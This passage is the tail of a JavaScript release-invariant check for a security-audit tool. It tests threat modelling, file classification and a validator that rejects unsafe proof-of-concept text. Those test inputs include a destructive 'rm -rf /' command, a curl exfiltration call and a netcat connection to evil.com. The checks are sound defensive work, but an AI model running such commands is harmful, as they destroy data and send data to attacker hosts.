        if (stabRes.meanJaccardSimilarity !== 1.0 || stabRes.totalUniqueLineages !== 1) {
          throw new Error(`evaluateStability failed line-shift invariant: J=${stabRes.meanJaccardSimilarity}, unique=${stabRes.totalUniqueLineages}`);
        }
      }
    },
    {
      id: 'SEC-INV-20',
      name: 'Multi-Profile Threat Modeling & Granular Coverage Classification Invariant',
      check: () => {
        // 1. detectRepositoryInventory extracts facts
        const inv = detectRepositoryInventory(repoRoot);
        if (!inv.profiles.includes('agent-plugin') || !inv.languages.includes('JavaScript')) {
          throw new Error('detectRepositoryInventory failed to discover agent-plugin or JavaScript');
        }

        // 2. buildThreatModel produces evidence-bound components and grounds assumptions
        const tm = buildThreatModel(repoRoot);
        if (!tm.targetProfile || tm.targetProfile.primary !== 'agent-plugin') {
          throw new Error(`buildThreatModel failed targetProfile validation: got ${tm.targetProfile?.primary}`);
        }
        const pluginComp = tm.components.find(c => c.name === 'PluginSystem');
        if (!pluginComp || !pluginComp.evidence || !pluginComp.evidence.path) {
          throw new Error('buildThreatModel component lacks verified evidence pointer');
        }
        const authActor = tm.actors.find(a => a.id === 'authenticated-user');
        if (!authActor || authActor.status !== 'ASSUMPTION') {
          throw new Error('buildThreatModel failed to classify unevidenced actor as ASSUMPTION');
        }

        // 3. categorizeDirectory never blanket excludes test surfaces & recognizes build directories (R2-P0-10)
        const testDir = categorizeDirectory('test');
        if (testDir.status !== 'SCANNED_TEST_EXECUTABLE') {
          throw new Error(`categorizeDirectory blanket excluded test surface: got ${testDir.status}`);
        }
        const ciDir = categorizeDirectory('.github');
        if (ciDir.status !== 'SCANNED_CI') {
          throw new Error(`categorizeDirectory failed to classify .github as SCANNED_CI: got ${ciDir.status}`);
        }
        const cmakeDir = categorizeDirectory('cmake');
        if (cmakeDir.status !== 'SCANNED_BUILD') {
          throw new Error(`categorizeDirectory failed to classify cmake as SCANNED_BUILD: got ${cmakeDir.status}`);
        }

        // 4. classifyFile classifies individual files & prevents executable bypass in static/
        const cCi = classifyFile('.github/workflows/ci.yml');
        const cCtx = classifyFile('rules/AGENTS.md');
        const cTest = classifyFile('test/scanner.test.js');
        const cBuild = classifyFile('package.json');
        const cStaticMedia = classifyFile('static/images/logo.png');
        const cStaticScript = classifyFile('static/scripts/exploit.js');
        if (cCi.classification !== 'SCANNED_CI' ||
            cCtx.classification !== 'SCANNED_AGENT_CONTEXT' ||
            cTest.classification !== 'SCANNED_TEST_EXECUTABLE' ||
            cBuild.classification !== 'SCANNED_BUILD' ||
            cStaticMedia.classification !== 'EXCLUDED_STATIC_ASSET' ||
            cStaticScript.classification !== 'SCANNED_RUNTIME' ||
            cStaticScript.isScanned !== true) {
          throw new Error('classifyFile failed to accurately classify file attack surfaces or allowed executable bypass');
        }

        // 5. Synthetic Non-Node Repository Threat Model Validation
        const synDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-inv-tm-'));
        try {
          fs.mkdirSync(path.join(synDir, 'handlers'), { recursive: true });
          fs.mkdirSync(path.join(synDir, 'auth'), { recursive: true });
          fs.writeFileSync(path.join(synDir, 'main.go'), 'package main', 'utf8');

          const synTm = buildThreatModel(synDir);
          const synApi = synTm.components.find(c => c.name === 'API');
          if (!synApi || synApi.evidence.path !== 'handlers/') {
            throw new Error('Synthetic Go repo API component had dangling or incorrect evidence path');
          }
          const synAuth = synTm.components.find(c => c.name === 'Auth');
          if (!synAuth || synAuth.evidence.path !== 'auth/' || synAuth.evidence.manifestOrigin === 'package.json:dependencies') {
            throw new Error('Synthetic Go repo Auth component fabricated package.json evidence');
          }
          const synOp = synTm.actors.find(a => a.id === 'system-operator');
          if (!synOp || synOp.status !== 'ASSUMPTION' || synOp.evidence !== null) {
            throw new Error('system-operator claimed FACT in repo without CI');
          }
        } finally {
          fs.rmSync(synDir, { recursive: true, force: true });
        }
      }
    },
    {
      id: 'SEC-INV-21',
      name: 'Finding Type & Safe Defensive Proof Policy Invariant',
      check: () => {
        // 1. validateFindingType separates vulnerabilities from hardening and informational
        const v = validateFindingType('VULNERABILITY');
        const h = validateFindingType('HARDENING');
        const i = validateFindingType('INFORMATIONAL');
        const d = validateFindingType('UNSPECIFIED', 'CWE-hardening', 'Stricter CSP config');
        const infoExposure = validateFindingType(null, 'CWE-200', 'Sensitive Information Disclosure in API');
        if (!v.valid || !h.valid || !i.valid || d.findingType !== 'HARDENING' || infoExposure.findingType !== 'VULNERABILITY') {
          throw new Error('validateFindingType failed to validate or infer finding types or misclassified information disclosure');
        }

        // 2. Hardening cannot masquerade as CRITICAL / HIGH vulnerability
        const testHardening = {
          id: 'SEC-TEST-H',
          ruleId: 'SEC-HARD',
          title: 'Hardening Title',
          findingType: 'HARDENING',
          severity: 'CRITICAL',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 }
        };
        const validatedH = validateCanonicalFindings([testHardening], repoRoot);
        if (validatedH[0].severity !== 'LOW') {
          throw new Error(`Hardening finding was not capped to LOW severity: got ${validatedH[0].severity}`);
        }

        // 3. validateSafeProof blocks prohibited proof patterns (destructive commands, live exploits, exfil, netcat)
        const safeProof = validateSafeProof('Source-to-sink dataflow trace', 'STATIC_TRACE');
        const badCmd = validateSafeProof('rm -rf / --no-preserve-root', 'UNIT_TEST');
        const badExfil = validateSafeProof('curl https://burpcollaborator.net/leak', 'STATIC_TRACE');
        const badNetcat = validateSafeProof('nc evil.com 4444', 'STATIC_TRACE');
        const badExploit = validateSafeProof('LIVE_EXPLOIT executed against production', 'STATIC_TRACE');
        if (!safeProof.valid || badCmd.valid || badExfil.valid || badNetcat.valid || badExploit.valid) {
          throw new Error('validateSafeProof failed to block prohibited offensive exploit, destructive command, or netcat');
        }

        // 4. Prohibited proof in candidate (including attackPath) downgrades to DEFERRED fail-closed
        const badCandidate = {
          id: 'SEC-TEST-BAD-POC',
          ruleId: 'CWE-78',
          title: 'Command Injection',
          proof: 'benign trace',
          attackPath: { steps: [], proofOfConcept: 'rm -rf / --no-preserve-root' },
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
          disposition: 'REPORTABLE',
          verdict: 'CONFIRMED',
          consensus: { supports: 3, totalVotes: 3 },
          rigor: { score: 0.9 }
        };
        const validatedBad = validateCanonicalFindings([badCandidate], repoRoot);
        if (validatedBad[0].disposition !== 'DEFERRED' || !validatedBad[0].dispositionReason.includes('PROHIBITED_PROOF_VIOLATION')) {
          throw new Error('Candidate with prohibited proof pattern was not downgraded to DEFERRED fail-closed');
        }
      }
    }
  ];

  for (const inv of securityInvariants) {
    try {
      inv.check();
    } catch (err) {
      errors.push(`Security Invariant Violation [${inv.id}: ${inv.name}]: ${err.message}`);
    }
  }

  return {
    passed: errors.length === 0,
    errors,
    warnings,
    verifiedFilesCount: REQUIRED_FILES.length,
    verifiedInvariantsCount: securityInvariants.length
  };

}

// -----------------------------------------------------------------------------
// CLI Dispatch
// -----------------------------------------------------------------------------
const isDirectExecution = process.argv[1] && process.argv[1].endsWith('check-release-invariants.mjs');

if (isDirectExecution) {
  console.log('Validating Section 24 Release Invariants Gate...');
  const result = checkReleaseInvariants(process.cwd());

  if (!result.passed) {
    console.error(`\n❌ Release Invariants Gate FAILED with ${result.errors.length} error(s):`);
    for (const err of result.errors) {
      console.error(`  - ${err}`);
    }
    process.exit(1);
  }

  console.log(`\n✔ Release Invariants Gate PASSED! (${result.verifiedFilesCount} required specifications and scripts verified, ${result.verifiedInvariantsCount} authoritative security invariants verified, 0 external dependencies, all automated invariants green).`);
}


